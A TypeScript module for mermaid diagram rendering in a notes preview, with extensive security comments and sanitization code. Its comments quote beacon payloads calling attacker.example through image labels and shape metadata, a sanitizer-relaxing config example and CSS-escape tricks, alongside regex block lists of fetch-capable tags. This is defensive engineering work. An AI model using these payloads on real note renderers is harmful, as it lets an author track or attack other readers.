/**
 * Mermaid diagram support for the markdown preview (issue #625).
 *
 * A ` ```mermaid ` fence renders as a diagram instead of a code block, the
 * way GitHub / Obsidian / Notion render it. Two pieces:
 *
 *   1. `mermaidFenceHtml()` — the synchronous placeholder markdown-it emits.
 *      It carries the escaped source, so an unrendered (still loading) or
 *      unparseable diagram degrades to readable source rather than a blank
 *      block.
 *   2. `renderMermaidBlocks()` — the asynchronous pass that swaps those
 *      placeholders for SVG.
 *
 * Mermaid (~3 MB with its per-diagram-type module graph) is reached only
 * through `import('mermaid')` here, so a note without a mermaid fence never
 * downloads it.
 *
 * SECURITY: note content is untrusted (any workspace collaborator or
 * editor-role share-link visitor can write a fence, and it renders in someone
 * else's session), and this is the one place the preview assigns note-derived
 * markup with `innerHTML`. Three layers keep the preview's no-raw-HTML
 * posture instead of delegating it wholesale to the engine:
 *
 *   - `securityLevel: 'strict'` plus an extended `secure` key list, so
 *     mermaid sanitizes labels and ignores `click` directives, and
 *     `htmlLabels: false` (root *and* per-diagram), so a node label is SVG
 *     text rather than an HTML subtree (issue #721 — see the note on the
 *     layout window below).
 *   - `prepareFenceSource()` bounds and cleans the fence body before the
 *     engine sees it: it caps its length, refuses the sources that make the
 *     engine fetch a URL while it lays the diagram out (see below), and
 *     `stripConfigDirectives()` removes the two config carriers — `%%{...}%%`
 *     directives and leading front matter — so a note cannot push per-diagram
 *     config (notably `themeCSS`) into the `<style>` block mermaid emits. The
 *     strip uses mermaid's own carrier patterns, because `secure` only pins
 *     TOP-LEVEL keys: anything the strip misses but the engine still
 *     recognizes reaches the config as a nested override. `securityLevel` is
 *     directive-protected by mermaid itself; `themeCSS` and friends are only
 *     protected because we strip and pin them.
 *   - `sanitizeSvg()` runs the engine's output through DOMPurify (allowlist,
 *     SVG+HTML profiles) and hands `apply()` a `DocumentFragment`, so the tree
 *     that was inspected is the tree that reaches the document — no
 *     re-serialize/re-parse step for a mutation-XSS gap to open in.
 *
 * `securityLevel: 'sandbox'` (mermaid's own advice for untrusted input) is
 * deliberately not used: it wraps every diagram in an iframe, which breaks
 * sizing, text selection and the preview's light/dark surface. Be precise
 * about what that costs, because layer 3 is NOT an equivalent substitute:
 * outside sandbox mode `mermaid.render()` appends its own `d<id>` host div to
 * `document.body`, lays the diagram out there (it needs a rendered box to
 * measure text), and only then serializes it — so the engine's output exists
 * in the reader's live document *before* `sanitizeSvg()` ever sees it. Layer 3
 * governs what *persists* in the preview; it is not a fetch boundary.
 *
 * That window is why `htmlLabels: false` is part of layer 1 rather than a
 * styling choice (issue #721). With HTML labels on, a label is a
 * `<foreignObject>` subtree the engine parses into the live document to measure
 * it, so `A["<img src=https://attacker.example/beacon>"]` fetched the URL —
 * disclosing every reader's IP, User-Agent, and reading time to the note's
 * author — while `sanitizeSvg()`, running strictly downstream, still removed
 * every `<img>` from what persisted. No `FORBID_TAGS`/`ALLOWED_URI_REGEXP`
 * tuning reaches a request that has already gone out. With HTML labels off
 * there is no label subtree to lay out: the same payload measures and renders
 * as literal SVG text. The cost is HTML *styling* inside a label — no bold,
 * italic or markdown formatting; `<br/>` still breaks the line, because
 * mermaid splits SVG-text labels on it itself (verified under the pinned
 * build). It is the whole reason the key is pinned in `SECURE_KEYS` and the
 * carriers stripped, so a note cannot turn it back on.
 *
 * `htmlLabels: false` alone does NOT close that window, because not every
 * fetch in it runs through a label (verified against the pinned
 * `mermaid@11.16.0` build, `dist/chunks/mermaid.core/`):
 *
 *   - Shape metadata carries an image independently of label mode:
 *     `A@{ img: "https://attacker.example/beacon.png" }` reaches
 *     `imageSquare()`, which does `new Image(); img.src = node.img; await
 *     img.decode()` and then appends an SVG `<image href>` to the live layout
 *     host. Two requests, no label involved.
 *   - Several diagram types (venn text nodes, architecture icons, kanban,
 *     sequence) append a `foreignObject` with no `htmlLabels` guard, and
 *     mermaid's own strict-mode `sanitizeText()` runs DOMPurify with its
 *     DEFAULT allowlist, which permits `<img src>`. A raw `<img>` in such a
 *     label is therefore laid out — and fetched — in the live document too.
 *
 * So `prepareFenceSource()` refuses a fence whose SOURCE carries a fetch:
 * a fetch-capable raw HTML tag, `img:` shape metadata, or an external CSS
 * `url()`/`@import`. That costs nothing a reader could ever see, because
 * layer 3 already forbids every one of those in what persists (`FORBID_TAGS`
 * covers `img`/`image`, `isSafeCss()` covers the CSS) — the only thing the
 * refusal removes is the request itself. Entity-encoding is not a way around
 * it: an HTML parser turns `&#60;img>` into text, not an element. A
 * restrictive `img-src` CSP would fix the whole class app-wide and remains the
 * better long-term answer; the repo has no CSP today.
 */

import type { Config as PurifyConfig, DOMPurify as Purifier } from 'dompurify';

/** Mermaid palette, following the preview's light/dark surface. */
export type MermaidTheme = 'default' | 'dark';

/**
 * The subset of the mermaid module this file uses. Declared structurally so
 * mermaid's own (very large) config types stay out of the notes package's
 * public declarations, and so tests can supply a stub engine.
 */
export interface MermaidLike {
  initialize(config: Record<string, unknown>): void;
  render(id: string, text: string): Promise<{ svg: string }>;
}

/** Resolves the mermaid engine, or `null` when it cannot be loaded. */
export type MermaidLoader = () => Promise<MermaidLike | null>;

const BLOCK_CLASS = 'note-mermaid';
const SOURCE_CLASS = 'note-mermaid-source';
const MESSAGE_CLASS = 'note-mermaid-message';
const PENDING_ATTR = 'data-mermaid-pending';
const ERROR_ATTR = 'data-mermaid-error';

/** Selects placeholders that still need a render attempt. */
const PENDING_SELECTOR = `.${BLOCK_CLASS}[${PENDING_ATTR}]`;

/**
 * A rendered diagram is kept as a sanitized `DocumentFragment`, never as
 * markup: `apply()` inserts a clone of it. See `sanitizeSvg()`.
 */
type Rendered = { node: DocumentFragment } | { error: string };

/**
 * Render outcomes keyed by `theme source`. The preview re-renders on every
 * keystroke in split mode, so without this the mermaid layout engine would
 * re-run for every diagram on the page per character typed. Failures are
 * cached too — a diagram is unparseable for most of the time it is being
 * typed, and because passes are serialized (see `passChain`) a failure is a
 * deterministic property of the source rather than a concurrency artifact.
 *
 * Least-recently-used, not insertion-ordered: reads move the entry back to
 * the end. A stable diagram is looked up on every keystroke, so it survives
 * the flood of one-shot sources produced while an adjacent diagram is typed.
 */
const renderCache = new Map<string, Rendered>();
const RENDER_CACHE_LIMIT = 40;

let renderSeq = 0;

function touch(key: string, result: Rendered): void {
  renderCache.delete(key);
  renderCache.set(key, result);
}

function remember(key: string, result: Rendered): void {
  touch(key, result);
  if (renderCache.size > RENDER_CACHE_LIMIT) {
    const oldest = renderCache.keys().next();
    if (!oldest.done) renderCache.delete(oldest.value);
  }
}

/**
 * The placeholder for one mermaid fence. `escape` is markdown-it's own
 * `escapeHtml`, passed in so this module stays free of a markdown-it import.
 */
export function mermaidFenceHtml(
  source: string,
  escape: (str: string) => string,
): string {
  return (
    `<div class="${BLOCK_CLASS}" ${PENDING_ATTR}="true">` +
    `<pre class="${SOURCE_CLASS}">${escape(source)}</pre>` +
    `</div>\n`
  );
}

let loaded: Promise<MermaidLike | null> | null = null;
let initializedTheme: MermaidTheme | null = null;

/**
 * Loads mermaid once per page. A failed load (offline, blocked chunk) resolves
 * to `null` and is not retried — the placeholders keep showing their source.
 */
const loadMermaid: MermaidLoader = () => {
  loaded ??= import('mermaid')
    .then((mod) => mod.default as unknown as MermaidLike)
    .catch(() => null);
  return loaded;
};

let purifier: Promise<Purifier | null> | null = null;

/**
 * DOMPurify is loaded next to the engine rather than statically, so a note
 * with no mermaid fence still downloads neither (mermaid depends on DOMPurify
 * itself, so this costs no bytes a diagram was not already paying for). A
 * failed load resolves to `null` and no diagram renders — the placeholders
 * keep showing their source, which is the same degradation as a failed engine
 * load and strictly better than painting unsanitized markup.
 */
function loadPurifier(): Promise<Purifier | null> {
  purifier ??= import('dompurify').then((mod) => mod.default).catch(() => null);
  return purifier;
}

/**
 * Config keys a `%%{init}%%` directive may not override. Mermaid strips only
 * the keys listed here, and its default list covers `securityLevel` but not
 * the theming keys, which reach the `<style>` element inside the emitted SVG.
 */
const SECURE_KEYS = [
  // mermaid's own defaults, repeated because `secure` replaces the list.
  'secure',
  'securityLevel',
  'startOnLoad',
  'maxTextSize',
  'suppressErrorRendering',
  'maxEdges',
  // Theming/labels: note-controlled values here become document-scoped CSS.
  'theme',
  'themeCSS',
  'themeVariables',
  'fontFamily',
  'altFontFamily',
  'htmlLabels',
  'layout',
  'look',
  // Mermaid's strict-mode `sanitizeText()` hands `dompurifyConfig` straight to
  // DOMPurify, so a value here relaxes the engine's OWN label sanitizer —
  // `{"ADD_TAGS":["script"],"ADD_ATTR":["onerror"]}` would turn a surviving
  // HTML label path from a beacon into script execution.
  'dompurifyConfig',
  // The per-diagram sections that carry their own `htmlLabels`. Pinning the
  // root key is not enough: a few renderers read `flowchart.htmlLabels` /
  // `class.htmlLabels` directly (see the `initialize()` call below), and
  // `secure` pins TOP-LEVEL keys only, so the whole section has to be pinned
  // to keep a nested override from re-enabling HTML labels there.
  'flowchart',
  'class',
];

/**
 * The mermaid release the carrier patterns below were copied from. They are
 * verbatim copies of a NON-EXPORTED upstream module, so nothing here can be
 * derived from the installed engine at runtime, and `mermaid: ^11.16.0` lets a
 * routine minor/patch upgrade move the patterns while these copies stay put —
 * exactly the drift that leaves a live carrier behind.
 *
 * `preview.test.ts` asserts this equals the installed `mermaid` version, so an
 * upgrade fails the suite until someone re-diffs `src/utils/regexes.ts` and
 * moves this constant.
 */
export const MERMAID_CARRIER_PATTERNS_VERSION = '11.16.0';

/**
 * Mermaid's own carrier patterns, copied verbatim from its `src/utils/regexes.ts`
 * (`directiveRegex` / `frontMatterRegex`, mermaid
 * `MERMAID_CARRIER_PATTERNS_VERSION`). Recognizing LESS than the engine does is
 * the whole failure mode here — a carrier we leave in place is one the engine
 * still reads. Note in particular that the closing
 * `}%%` of a directive is OPTIONAL for mermaid, so an unterminated `%%{init:`
 * runs to the end of the diagram; matching that exactly means an unterminated
 * directive is stripped exactly as far as mermaid would have read it.
 */
const DIRECTIVE_RE =
  /%{2}{\s*(?:(\w+)\s*:|(\w+))\s*(?:(\w+)|((?:(?!}%{2}).|\r?\n)*))?\s*(?:}%{2})?/gi;
const FRONTMATTER_RE = /^([^\S\n\r]*)-{3}\s*[\n\r](.*?)[\n\r]\1-{3}\s*[\n\r]+/s;

/**
 * Longest fence body handed to the engine. It is mermaid's own default
 * `maxTextSize`, pinned here as well because the engine checks it INSIDE
 * `render()` — after `prepareFenceSource()` has already scanned and stripped
 * the whole body — so it bounds nothing this module does.
 */
export const MAX_FENCE_CHARS = 50_000;

/**
 * Passes `stripConfigDirectives()` may take. See its doc comment: the bound is
 * what keeps a hostile fence from making the strip quadratic.
 */
const MAX_STRIP_PASSES = 8;

/**
 * Removes note-supplied mermaid configuration from a fence body. `secure`
 * blocks the keys listed above, but only at the TOP level of the config, so a
 * carrier that survives here can still deliver a nested override; this strips
 * the carriers themselves rather than depending on that list.
 *
 * Front matter goes first (mermaid's own preprocess order) and goes
 * unconditionally: it is dropped whether or not it looks like it carries
 * `config:`, because YAML can spell that key in more ways than a regex can
 * enumerate (`"config":`, `'config':`, `? config`, aliases). The cost is
 * mermaid's front-matter `title:`/`displayMode:`, which the preview does not
 * advertise; the alternative is a rule that can be spelled around.
 *
 * Iterates rather than running once, because `FRONTMATTER_RE` is `^`-anchored
 * and a single pass therefore *manufactures* a carrier the source did not have
 * (issue #721): removing the first `---` block promotes the second to leading
 * front matter, which mermaid then parses, and removing a leading `%%{init}%%`
 * directive promotes a `---` block that followed it the same way. Directive
 * removal can promote a directive too, by joining text around the match
 * (`%` + `%%{a}%%` + `%{b}%%` leaves a fresh `%%{b}%%`).
 *
 * The iteration is BOUNDED rather than run to a fixpoint, and the bound is
 * load-bearing: the fence body is attacker-controlled and unbounded, each pass
 * rescans all of it, and each pass is only guaranteed to remove ONE leading
 * front-matter block — a fence of stacked minimal blocks is quadratic, i.e. a
 * stored main-thread freeze for every reader. Mermaid's `maxTextSize` does not
 * help, because the engine enforces it inside `render()`, strictly after this
 * has already run. `prepareFenceSource()` caps the length first and this caps
 * the passes, so the work is bounded by `MAX_FENCE_CHARS * MAX_STRIP_PASSES`
 * (a few hundred kB of scanning) no matter what a note contains.
 *
 * Returns `null` when the source is still changing after the last pass: a
 * source that stacks that many carriers is hostile, and refusing it is
 * strictly safer than handing the engine a body we know we have not finished
 * stripping. Legitimate sources need one pass, or two if they are
 * front-matter-titled.
 */
export function stripConfigDirectives(source: string): string | null {
  let stripped = source;
  for (let pass = 0; pass < MAX_STRIP_PASSES; pass++) {
    const next = stripped.replace(FRONTMATTER_RE, '').replace(DIRECTIVE_RE, '');
    if (next === stripped) return stripped;
    stripped = next;
  }
  return null;
}

/**
 * Source constructs that make the engine fetch a URL while it lays the diagram
 * out in the live document — i.e. upstream of `sanitizeSvg()`, which is why
 * they are refused rather than sanitized. See the SECURITY note at the top of
 * this file for why `htmlLabels: false` does not cover them.
 *
 * `FETCH_TAG_RE` is deliberately a tag-name list rather than "any raw HTML":
 * `<br/>`, `<b>`, `<i>` and the class-diagram arrows (`<|--`, `<-->`) stay
 * usable, since none of them reaches the network. It matches on a literal `<`
 * only, which is all an HTML parser can turn into an element.
 */
const FETCH_TAG_RE =
  /<\s*\/?\s*(?:img|image|iframe|embed|object|video|audio|source|track|input|link|script|use|svg|math|base|meta|frame|frameset|portal)\b/i;

/**
 * `img:` inside a `@{ … }` shape-metadata block — mermaid's image shape, whose
 * renderer fetches the URL twice (`new Image().decode()` plus an SVG
 * `<image href>` in the layout host). The gap to the closing `}` is
 * unconstrained on purpose: a `}` inside a quoted metadata value would
 * otherwise hide the key from a `[^}]*` scan, and recognizing LESS than the
 * engine does is the failure mode here. The cost is a false positive on a
 * label that says `img:` after some other metadata block, which degrades to a
 * message on the block rather than to a beacon.
 */
const IMAGE_METADATA_RE = /@\s*\{[\s\S]*?["']?img["']?\s*:/i;

/**
 * A sequence-diagram actor's `properties` block — `properties A: {"icon": … }`.
 * Spelled in pure diagram syntax, so it carries no `<`, no `@{` and no `url(`
 * and trips none of the other carriers, yet `drawImage()` appends an
 * `<image xlink:href>` per actor occurrence into the layout host during the
 * pass that runs in the reader's document. The renderer guards it with
 * neither `htmlLabels` nor `securityLevel`, and mermaid's own `sanitizeUrl`
 * passes `https:` through, so refusing the source is the only layer that
 * reaches it. Bounded to one line, unlike `IMAGE_METADATA_RE`, because that
 * is how the syntax is written — no `[\s\S]` span to over-match across.
 */
const ACTOR_ICON_RE = /^\s*properties\b.*?["']?icon["']?\s*:/im;

/**
 * A CSS fetch spelled in the fence SOURCE — a `style`/`classDef` declaration
 * reaches a label's `style` attribute, and in the label paths that stay HTML
 * regardless of `htmlLabels` the browser resolves it during layout.
 *
 * Narrower than `CSS_EXTERNAL_RE`, which guards mermaid's *output*: the bare
 * `image(` / `src(` functions are left out here because a diagram source is
 * mostly prose and `A["Resize image(s)"]` must not be refused. Neither is a
 * loss — no browser ships CSS `image()`, and both are still rejected by
 * `isSafeCss()` in whatever the engine emits.
 */
const CSS_SOURCE_FETCH_RE =
  /@import|(?:image-set|cross-fade)\s*\(|url\(\s*['"]?\s*(?!#)/i;

/** As `isSafeCss()`: escapes are resolved for DETECTION, never rewritten. */
function hasCssFetch(source: string): boolean {
  return (
    CSS_SOURCE_FETCH_RE.test(source) ||
    CSS_SOURCE_FETCH_RE.test(decodeCssEscapes(source))
  );
}

/** The fence body prepared for the engine, or the message to show instead. */
export type Prepared = { text: string } | { error: string };

/**
 * Bounds and cleans a fence body before the engine sees it. Layer 2 of the
 * SECURITY note above; every check here exists because the engine's own
 * pre-serialize layout pass happens in the reader's live document, where
 * neither `sanitizeSvg()` nor mermaid's `maxTextSize` can reach it.
 */
export function prepareFenceSource(source: string): Prepared {
  if (source.length > MAX_FENCE_CHARS) {
    return {
      error: `Diagram error: source is longer than ${MAX_FENCE_CHARS} characters`,
    };
  }
  // Strip BEFORE scanning, so the refusals below see exactly the text the
  // engine will. `stripConfigDirectives()` joins the text around each removed
  // carrier, so a construct can be assembled by a directive that splits it:
  // `A@%%{x}%%{ img: … }` matches nothing while the `%%{x}%%` is still in it,
  // and is a beacon the moment the strip closes the gap. Scanning the raw
  // source recognizes LESS than the engine does, which is the failure mode
  // this layer exists to avoid.
  const stripped = stripConfigDirectives(source);
  if (stripped === null) {
    return { error: 'Diagram error: too many stacked config directives' };
  }
  if (FETCH_TAG_RE.test(stripped)) {
    return { error: 'Diagram error: HTML that loads a URL is not allowed' };
  }
  if (IMAGE_METADATA_RE.test(stripped)) {
    return { error: 'Diagram error: image shapes are not allowed' };
  }
  if (ACTOR_ICON_RE.test(stripped)) {
    return { error: 'Diagram error: actor icons are not allowed' };
  }
  if (hasCssFetch(stripped)) {
    return { error: 'Diagram error: CSS that loads a URL is not allowed' };
  }
  return { text: stripped };
}

const PURIFY_CONFIG: PurifyConfig & { RETURN_DOM_FRAGMENT: true } = {
  // SVG (+ filters) for the diagram, HTML for the `<foreignObject>` subtrees
  // mermaid emits. `htmlLabels: false` means node labels are no longer among
  // them, but several diagram types (venn text nodes, architecture icons,
  // kanban, sequence) append a `foreignObject` with no `htmlLabels` guard, so
  // dropping the HTML profile here would empty those labels while changing
  // nothing about the fetch carriers below — which are forbidden either way.
  USE_PROFILES: { svg: true, svgFilters: true, html: true },
  // DOMPurify excludes both by default because they are namespace-confusion
  // and external-reference carriers in a sanitize-to-STRING pipeline. Mermaid
  // needs them (labels are `<foreignObject>` subtrees, markers/icons are
  // `<use>` references), and this pipeline returns nodes, so the serialize →
  // re-parse step those attacks depend on never happens. `use` is still held
  // to `ALLOWED_URI_REGEXP` below, which is the same allowlist every other
  // reference in the tree answers to.
  ADD_TAGS: ['foreignobject', 'use'],
  // `<foreignObject>` is an HTML integration point per the HTML spec, so the
  // label subtree inside it is HTML and is checked against the HTML profile.
  // DOMPurify's default map omits it only because it excludes the tag itself.
  HTML_INTEGRATION_POINTS: { foreignobject: true, 'annotation-xml': true },
  // Fetch carriers on top of DOMPurify's own denylist. None of these appear in
  // mermaid output, and each would let note-derived markup pull a URL — an
  // IP-logging beacon — into every reader's page.
  FORBID_TAGS: ['img', 'image', 'audio', 'video', 'source', 'track', 'input'],
  FORBID_ATTR: ['ping', 'srcset', 'background', 'lowsrc', 'dynsrc'],
  // DOMPurify's default URI allowlist with the scheme list narrowed to what a
  // diagram needs: it links out (`http(s)`, `mailto:`) or within itself (`#`,
  // which the `[^a-z]` branch covers), and nothing else — no `ftp`/`tel`/
  // `callto`/`sms`/`cid`/`xmpp`/`matrix`.
  //
  // The two trailing branches are the default's own, and are NOT optional:
  // DOMPurify applies this regexp to the value of every allowed attribute that
  // is not `data-*`/`aria-*`/URI-safe, not just to the ones that hold a URL.
  // They are what lets a non-URI value through — `d="M0,0 L4,2"`,
  // `transform="translate(4,2)"`, `fill="none"`, `width="120"`, `viewBox`.
  // Dropping them strips a real diagram down to an empty `<svg>`. They still
  // reject anything carrying a scheme, `javascript:` and `data:` included,
  // because `[a-z+.\-]+` must be followed by a character that is not `:`.
  ALLOWED_URI_REGEXP:
    /^(?:(?:https?|mailto):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
  // Nodes, not markup — see `sanitizeSvg()`.
  RETURN_DOM_FRAGMENT: true,
};

/**
 * CSS constructs that fetch a URL. `url(#id)` is exempt: mermaid references
 * its own in-document markers and gradients that way.
 */
const CSS_EXTERNAL_RE =
  /@import|(?:image-set|image|src|cross-fade)\s*\(|url\(\s*['"]?\s*(?!#)/i;

/**
 * Resolves CSS escape sequences (`\40 import`, `\75 rl(...)`) so the check
 * below cannot be spelled around: the CSS parser resolves them, so a check
 * that reads the raw text sees a different stylesheet than the browser does.
 * Used for DETECTION only — the original text is what survives, because
 * decoding it would change what an escaped `}` or quote means.
 */
function decodeCssEscapes(css: string): string {
  return css.replace(
    /\\(?:([0-9a-f]{1,6})[ \t\n\r\f]?|([\s\S]))/gi,
    (_match, hex: string | undefined, char: string | undefined) => {
      if (hex === undefined) return char ?? '';
      const code = Number.parseInt(hex, 16);
      return String.fromCodePoint(
        code > 0x10ffff || code === 0 ? 0xfffd : code,
      );
    },
  );
}

function isSafeCss(css: string): boolean {
  return (
    !CSS_EXTERNAL_RE.test(css) && !CSS_EXTERNAL_RE.test(decodeCssEscapes(css))
  );
}

/**
 * Sanitizes engine output for the DOM. Layer 3 of the SECURITY note above.
 *
 * DOMPurify — allowlist-based, and already in this feature's dependency graph
 * because mermaid itself depends on it — does the element/attribute pass, and
 * the result is returned as a `DocumentFragment` that `apply()` inserts
 * directly. Deliberately NOT a string: sanitizing a tree and then
 * re-serializing it for `innerHTML` re-parses it, and the tree that was
 * inspected is then not the tree that reaches the document (mutation XSS).
 *
 * CSS is the one thing DOMPurify does not look inside, and an inline-SVG
 * `<style>` is document-scoped — a surviving `@import`/`url()` would restyle
 * the whole app or phone home from it. Mermaid namespaces its own rules under
 * the per-diagram `#id`, so an offending block is dropped whole rather than
 * patched: nothing legitimate needs the constructs being rejected.
 */
export function sanitizeSvg(purify: Purifier, svg: string): DocumentFragment {
  const fragment = purify.sanitize(svg, PURIFY_CONFIG);
  for (const el of Array.from(fragment.querySelectorAll('style'))) {
    // The browser builds the stylesheet from the element's *child text
    // content* — its direct `Text` children, concatenated — while
    // `textContent` concatenates every descendant's text. The two differ
    // exactly when a `<style>` has an element child, and this pipeline
    // manufactures that case: mermaid serializes an HTML-namespace raw-text
    // `<style>`, and DOMPurify re-parses it inside `<svg>`, where the same
    // bytes are markup. `@im<title>x</title>port` then reads as `@import` to
    // the CSS parser and as `@imxport` to the check below. Mermaid never emits
    // a `<style>` with an element child, so drop the block rather than trying
    // to reconcile the two readings.
    if (el.firstElementChild) {
      el.remove();
      continue;
    }
    if (!isSafeCss(el.textContent ?? '')) el.remove();
  }
  for (const el of Array.from(fragment.querySelectorAll('[style]'))) {
    if (!isSafeCss(el.getAttribute('style') ?? '')) el.removeAttribute('style');
  }
  return fragment;
}

/**
 * Per-root pass counter. `render()` bumps it, so a pass that was already
 * awaiting the engine (or a diagram) when the preview re-rendered stops
 * instead of racing the newer pass for the same DOM.
 */
const passSeq = new WeakMap<Element, number>();

/**
 * All passes run through one chain. Mermaid's config (including the palette)
 * and its layout engine are process-global singletons, so overlapping passes
 * would both `initialize()` and `render()` against the same global state —
 * one diagram rendered under the other pass's theme, then cached under this
 * pass's theme key. Serializing also bounds concurrency to a single
 * `mermaid.render()` no matter how fast the user types.
 */
let passChain: Promise<void> = Promise.resolve();

type PendingBlock = { el: Element; source: string; key: string };

/**
 * Applies cached outcomes in place (synchronously, so typing beside a rendered
 * diagram never flashes back to source) and returns the placeholders that
 * still need the engine.
 */
function collectPending(root: Element, theme: MermaidTheme): PendingBlock[] {
  const pending: PendingBlock[] = [];
  for (const el of Array.from(root.querySelectorAll(PENDING_SELECTOR))) {
    const source = el.querySelector(`.${SOURCE_CLASS}`)?.textContent ?? '';
    const key = `${theme} ${source}`;
    const cached = renderCache.get(key);
    if (cached) {
      touch(key, cached);
      apply(el, cached);
      continue;
    }
    pending.push({ el, source, key });
  }
  return pending;
}

/**
 * Renders every pending mermaid placeholder under `root`.
 *
 * Safe to call on every keystroke: cached outcomes land before the returned
 * promise is even created, the engine work is serialized against every other
 * pass, and a pass superseded by a newer `render()` abandons its remaining
 * diagrams. The returned promise never rejects — per-diagram failures become
 * an error label on the block.
 */
export function renderMermaidBlocks(
  root: Element,
  options: { theme?: MermaidTheme; load?: MermaidLoader } = {},
): Promise<void> {
  const theme = options.theme ?? 'default';
  const load = options.load ?? loadMermaid;

  // Bumped even when nothing is pending: a re-render with no fence still means
  // the placeholders an in-flight pass holds are detached and stale.
  const generation = (passSeq.get(root) ?? 0) + 1;
  passSeq.set(root, generation);

  const pending = collectPending(root, theme);
  if (pending.length === 0) return Promise.resolve();

  const run = passChain
    .then(() => renderPass(root, generation, pending, theme, load))
    .catch(() => {
      // Nothing here is recoverable and the chain must survive for the next
      // pass; per-diagram errors are already reported on the block itself.
    });
  passChain = run;
  return run;
}

async function renderPass(
  root: Element,
  generation: number,
  pending: PendingBlock[],
  theme: MermaidTheme,
  load: MermaidLoader,
): Promise<void> {
  const superseded = () => passSeq.get(root) !== generation;
  if (superseded()) return;

  // The sanitizer is a hard requirement, not an enhancement: without it there
  // is nothing to paint engine output with.
  const [mermaid, purify] = await Promise.all([load(), loadPurifier()]);
  if (!mermaid || !purify || superseded()) return;

  if (initializedTheme !== theme) {
    // `startOnLoad: false`: the preview drives rendering itself rather than
    // letting mermaid scan the whole document. `securityLevel: 'strict'` plus
    // the extended `secure` list and `htmlLabels: false` keep the preview's
    // no-raw-HTML posture (see the SECURITY note at the top of this file).
    //
    // `htmlLabels` is set at BOTH altitudes on purpose. The root key is the
    // one mermaid documents (the per-diagram `flowchart.htmlLabels` is
    // deprecated) and its resolver is root-first —
    // `evaluate(config.htmlLabels ?? config.flowchart?.htmlLabels ?? true)` in
    // `getEffectiveHtmlLabels`, verified in the pinned 11.16.0 build. But not
    // every renderer goes through that resolver: `swimlane` reads
    // `evaluate(siteConfig.flowchart.htmlLabels)` and one shape reads
    // `evaluate(getConfig().flowchart?.htmlLabels)`, both of which ignore the
    // root key entirely. Setting the sections too makes the answer `false`
    // under either reading rather than resting on which one a given release
    // happens to use, and costs only a deduplicated deprecation warning that
    // mermaid's default `logLevel: 5` suppresses.
    mermaid.initialize({
      startOnLoad: false,
      securityLevel: 'strict',
      secure: SECURE_KEYS,
      maxTextSize: MAX_FENCE_CHARS,
      htmlLabels: false,
      flowchart: { htmlLabels: false },
      class: { htmlLabels: false },
      theme,
    });
    initializedTheme = theme;
  }

  for (const { el, source, key } of pending) {
    // A newer render() owns the preview's DOM now; stop rather than paint into
    // a replaced tree or cache a diagram under a stale theme.
    if (superseded()) return;
    // Belt and braces: this placeholder alone was detached (e.g. a caller
    // mutated the tree without going through render()).
    if (!root.contains(el)) continue;

    // An earlier pass may have rendered this very source after we collected
    // (the same diagram gets a fresh placeholder on every keystroke), so look
    // again rather than paying for a second identical layout.
    const cached = renderCache.get(key);
    if (cached) {
      touch(key, cached);
      apply(el, cached);
      continue;
    }

    let result: Rendered;
    const prepared = prepareFenceSource(source);
    if ('error' in prepared) {
      // Refused before the engine ever sees it — the point of every check in
      // `prepareFenceSource()` is that the engine's layout pass runs in the
      // reader's live document, so there is no undoing it afterwards.
      result = prepared;
    } else {
      const id = `note-mermaid-${++renderSeq}`;
      try {
        const { svg } = await mermaid.render(id, prepared.text);
        result = { node: sanitizeSvg(purify, svg) };
      } catch (err) {
        result = {
          error:
            err instanceof Error && err.message
              ? `Diagram error: ${err.message}`
              : 'Diagram error',
        };
      } finally {
        // Outside sandbox mode mermaid lays the diagram out in a `d<id>` host
        // div it appends to `document.body` (see the SECURITY note above), and
        // removes it only on the success path. Clean up unconditionally: on a
        // failed parse it would otherwise leak one host — with the engine's
        // un-DOMPurified output still in it — per keystroke, since a diagram
        // is unparseable for most of the time it is being typed.
        document.getElementById(`d${id}`)?.remove();
      }
    }
    remember(key, result);
    if (!superseded() && root.contains(el)) apply(el, result);
  }
}

function apply(el: Element, result: Rendered): void {
  el.removeAttribute(PENDING_ATTR);
  el.querySelector(`.${MESSAGE_CLASS}`)?.remove();
  if ('node' in result) {
    el.removeAttribute(ERROR_ATTR);
    // Nodes, not markup: the sanitized tree goes into the document as-is,
    // never back through an `innerHTML` re-parse. The cached fragment is
    // cloned because inserting a fragment empties it.
    el.replaceChildren(result.node.cloneNode(true));
    return;
  }
  // Unparseable diagram: keep the escaped source visible and label it, the
  // way a fenced block with a syntax error still shows its text.
  el.setAttribute(ERROR_ATTR, 'true');
  const message = document.createElement('p');
  message.className = MESSAGE_CLASS;
  message.textContent = result.error;
  el.prepend(message);
}

/** Test seam: drops memoized engine, palette, and cache state between cases. */
export function resetMermaidStateForTests(): void {
  renderCache.clear();
  loaded = null;
  purifier = null;
  initializedTheme = null;
  passChain = Promise.resolve();
}
